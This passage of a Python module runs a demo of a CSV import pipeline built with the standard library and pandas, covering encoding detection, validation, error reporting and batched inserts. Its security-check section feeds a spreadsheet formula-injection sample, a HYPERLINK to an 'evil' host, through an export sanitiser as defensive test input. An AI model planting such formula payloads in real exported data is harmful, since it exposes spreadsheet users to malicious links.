11. CATEGORY DTYPE ON A HIGH-CARDINALITY COLUMN
    Stores the codes AND the full unique index — MORE memory than plain
    strings.  Only use it when uniques are far fewer than rows.

12. pd.concat INSIDE A LOOP
    O(n^2) copying (and df.append() was removed in pandas 2.0).  Collect into
    a list, concat once.

13. read_excel ON A HUGE FILE
    There is no chunksize for Excel.  Use openpyxl read_only streaming, or
    convert to CSV first, or reject the upload with a clear message.

14. NOT CAPPING COLUMNS
    Everyone caps rows.  A 100,000-COLUMN file is small on disk and explodes
    the DataFrame.
"""


# ==========================================================================
# __main__ — end-to-end demo, runs with ZERO third-party packages
# ==========================================================================

def _hr(title: str) -> None:
    print("\n" + "-" * 72)
    print(f"  {title}")
    print("-" * 72)


def _run_demo() -> None:
    tmpdir = tempfile.mkdtemp(prefix="pandas_import_demo_")
    csv_path = os.path.join(tmpdir, "messy_upload.csv")

    print("\n" + "=" * 72)
    print("  Pandas for Tabular Data — Backend Import Pipeline Demo")
    print("=" * 72)

    # ---------------------------------------------------------------- 1 ---
    _hr("1. Generate a deliberately messy sample CSV (stdlib)")
    generate_messy_csv(csv_path)
    print(f"  Written: {csv_path}  ({os.path.getsize(csv_path)} bytes)")
    print(MESSY_CSV_NOTES)

    # ---------------------------------------------------------------- 2 ---
    _hr("2. Encoding + delimiter detection")
    encoding = detect_encoding(csv_path)
    delimiter = detect_delimiter(csv_path, encoding)
    print(f"  detected encoding : {encoding}")
    print(f"  detected delimiter: {delimiter!r}")
    print("  (utf-8-sig means a BOM was found — Excel's 'CSV UTF-8' export)")

    # ---------------------------------------------------------------- 3 ---
    _hr("3. Stdlib pre-scan → exact user-facing line numbers")
    scan = scan_delimited_file(csv_path, encoding, delimiter)
    print(f"  header line       : {scan.header_line}")
    print(f"  expected fields   : {scan.expected_fields}")
    print(f"  well-formed rows  : {len(scan.good)}")
    print(f"  ragged rows       : {len(scan.ragged)} "
          f"at lines {[r.line_start for r in scan.ragged]}")
    print(f"  good line numbers : {scan.good_line_numbers}")
    print("  NOTE: the multiline-note record spans 2 physical lines, which is")
    print("        why these numbers are NOT simply 2,3,4,...")

    # ---------------------------------------------------------------- 4 ---
    _hr("4. Header normalisation")
    header, missing, duplicates = check_header(scan.header, EXPECTED_COLUMNS)
    print(f"  raw        : {scan.header}")
    print(f"  normalised : {header}")
    print(f"  missing    : {missing or 'none'}")
    print(f"  duplicates : {duplicates or 'none'}")
    print("  (note the BOM stripped from the first key and 'Unit Price ' → 'unit_price')")

    # ---------------------------------------------------------------- 5 ---
    _hr("5. Value coercion helpers")
    money_cases = ["₹1,234.56", "(500.00)", "49.99", "$1 234.50", "abc", ""]
    for case in money_cases:
        minor, err = parse_money_to_minor_units(case)
        print(f"  money {case!r:<14} → minor_units={minor!r:<10} err={err!r}")
    print()
    for case in ["01/03/2024", "2024-03-01", "45301", "31/02/2024", "not a date"]:
        parsed, err = parse_date(case)
        print(f"  date  {case!r:<14} → {parsed!s:<12} err={err!r}")

    # ---------------------------------------------------------------- 6 ---
    _hr("6. Full import — PURE STDLIB pipeline (always runs)")
    inserted_batches: List[int] = []

    def fake_db_sink(batch: List[Dict[str, Any]]) -> None:
        """Stands in for session.execute(insert(Model), batch)."""
        inserted_batches.append(len(batch))

    report, rows = import_with_stdlib_csv(csv_path, batch_size=5, sink=fake_db_sink)
    print(f"  total_rows  : {report.total_rows}")
    print(f"  valid_rows  : {report.valid_rows}")
    print(f"  error_count : {report.error_count}")
    print(f"  batches sent to the DB sink: {inserted_batches}")
    print("\n  Row-level errors (what the user actually sees):")
    for err in report.errors:
        print(f"    {err}")
    if report.warnings:
        print("\n  Warnings:")
        for w in report.warnings:
            print(f"    {w}")

    print("\n  A few successfully imported rows:")
    for row in rows[:4]:
        print(f"    sku={row.sku:<22} qty={row.quantity:<3} "
              f"price_minor={row.unit_price_minor:<8} date={row.invoice_date}")
    print("  ^ note SKU '007123' and the 20-digit code kept their leading zeros")

    # ---------------------------------------------------------------- 7 ---
    _hr("7. JSON response shape for the import endpoint")
    error_csv = os.path.join(tmpdir, "import_errors.csv")
    report.write_error_csv(error_csv)
    body = report.as_dict(error_report_url="/imports/demo/errors.csv")
    for key in ("status", "total_rows", "valid_rows", "error_count",
                "errors_truncated", "error_report_url"):
        print(f"  {key:<20}: {body[key]}")
    print(f"  errors[0]           : {body['errors'][0] if body['errors'] else None}")
    print(f"  full error CSV      : {error_csv}")

    # ---------------------------------------------------------------- 8 ---
    _hr("8. Batching arithmetic for bulk insert")
    records = [r.as_record() for r in rows]
    n_cols = len(records[0]) if records else 8
    print(f"  columns per row              : {n_cols}")
    print(f"  Postgres bind-parameter cap  : 65535")
    print(f"  max safe batch size          : {max_safe_batch_size(n_cols)} rows")
    print(f"  batches at batch_size=5      : "
          f"{[len(b) for b in batched(records, 5)]}")
    print(f"  bulk_insert_sqlalchemy would insert: "
          f"{bulk_insert_sqlalchemy(records, batch_size=5)} rows")
    print(f"  bulk_insert_django would create   : "
          f"{bulk_insert_django(records, batch_size=5)} objects")

    # ---------------------------------------------------------------- 9 ---
    _hr("9. Security checks")
    for value in ["=HYPERLINK(\"http://evil\",\"Click\")", "+1234", "-5", "@SUM(A1)", "normal text"]:
        print(f"  export {value!r:<40} → {sanitise_for_csv_export(value)!r}")
    ok, reason = enforce_shape_limits(n_rows=len(rows), n_columns=n_cols)
    print(f"  shape limits: ok={ok} ({reason})")

    # --------------------------------------------------------------- 10 ---
    _hr("10. Tool decision table")
    print(f"  {'TOOL':<22} {'USE WHEN':<52}")
    for entry in TOOL_DECISION_TABLE:
        print(f"  {entry['tool']:<22} {entry['use_when']}")
        print(f"  {'':<22} avoid: {entry['avoid_when']}")

    # --------------------------------------------------------------- 11 ---
    _hr("11. Pandas pipeline (runs only if pandas is installed)")
    pd = _require_pandas("the pandas demo")
    if pd is None:
        print('  pandas not installed. Run: pip install "pandas>=2.2" openpyxl')
        print("  Everything above ran without it — that is the point of the")
        print("  stdlib pipeline in section 7.")
    else:
        print(f"  pandas {pd.__version__}")

        df = read_csv_safely(csv_path, encoding=encoding, delimiter=delimiter)
        print(f"  read_csv_safely → shape={df.shape}")
        print(f"  dtypes are all object/string: "
              f"{set(str(t) for t in df.dtypes.tolist())}")

        df = attach_user_row_numbers(df, scan.good_line_numbers)
        print(f"  _row column attached from the pre-scan: "
              f"{df['_row'].tolist()[:8]} ...")
        print("  NOTE: pandas SKIPPED the ragged line entirely (on_bad_lines")
        print("        ='warn'), so it reports one row fewer than the stdlib")
        print("        pipeline — which reported that line as a row error.")
        print("        Same file, different totals: decide which contract you")
        print("        want and make it explicit to the user.")

        pd_report = ImportReport()
        clean = validate_dataframe(df, pd_report)
        print(f"\n  total_rows={pd_report.total_rows} "
              f"valid_rows={pd_report.valid_rows} "
              f"error_count={pd_report.error_count}")
        print("  Row-level errors from the vectorised masks:")
        for err in pd_report.errors[:12]:
            print(f"    {err}")

        print(f"\n  memory: {dataframe_memory_mb(df):.4f} MB "
              f"(deep=True — counts the actual strings)")
        for label, mb in demo_memory_levers(df).items():
            print(f"    {label:<34} {mb:.4f} MB")
        print("  ^ 'email_as_category_ANTIPATTERN' is usually LARGER: high")
        print("    cardinality means you store codes AND the full uniques index")

        out_records = dataframe_to_records(
            clean, columns=["sku", "product_name", "email", "quantity_int",
                            "unit_price_minor", "invoice_date_parsed", "status"]
        )
        print(f"\n  dataframe_to_records → {len(out_records)} ORM-ready dicts")
        if out_records:
            sample = out_records[0]
            print(f"    sample: {sample}")
            print(f"    types : "
                  f"{ {k: type(v).__name__ for k, v in sample.items()} }")
            print("    ^ plain Python types: no numpy scalars, no NaN, None for nulls")

        # Chunked path over the same file (chunk_size deliberately tiny).
        chunk_batches: List[int] = []
        chunked_report = import_csv_chunked(
            csv_path, chunk_size=5, encoding=encoding,
            sink=lambda b: chunk_batches.append(len(b)),
        )
        print(f"\n  chunked import: total={chunked_report.total_rows} "
              f"valid={chunked_report.valid_rows} "
              f"errors={chunked_report.error_count} "
              f"batches={chunk_batches}")
        print("  (peak memory here is ONE chunk, not the whole file)")

        copy_sql = copy_from_stdin_postgres(
            clean, "products", ["sku", "email", "quantity_int"]
        )
        print(f"\n  COPY statement: {copy_sql}")

    # --------------------------------------------------------------- 12 ---
    _hr("12. Optional accelerators")
    polars_rows = import_with_polars(csv_path)
    if polars_rows is None:
        print('  polars not installed. Run: pip install "polars>=1.0"')
    else:
        print(f"  polars processed {polars_rows} rows")
    print(POLARS_VS_PANDAS)

    # --------------------------------------------------------------- 13 ---
    _hr("13. Reference material")
    print(EXCEL_GOTCHAS)
    print(IMPORT_MODES)

    print("\n" + "=" * 72)
    print(f"  Demo artefacts in: {tmpdir}")
    print("  Install the optional deps to exercise every section:")
    print('    pip install "pandas>=2.2" openpyxl python-calamine "polars>=1.0"')
    print("=" * 72 + "\n")


if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    )
    # Surface the ImportWarnings we raise for missing optional deps; by
    # default Python hides ImportWarning entirely.
    warnings.simplefilter("always", ImportWarning)
    _run_demo()
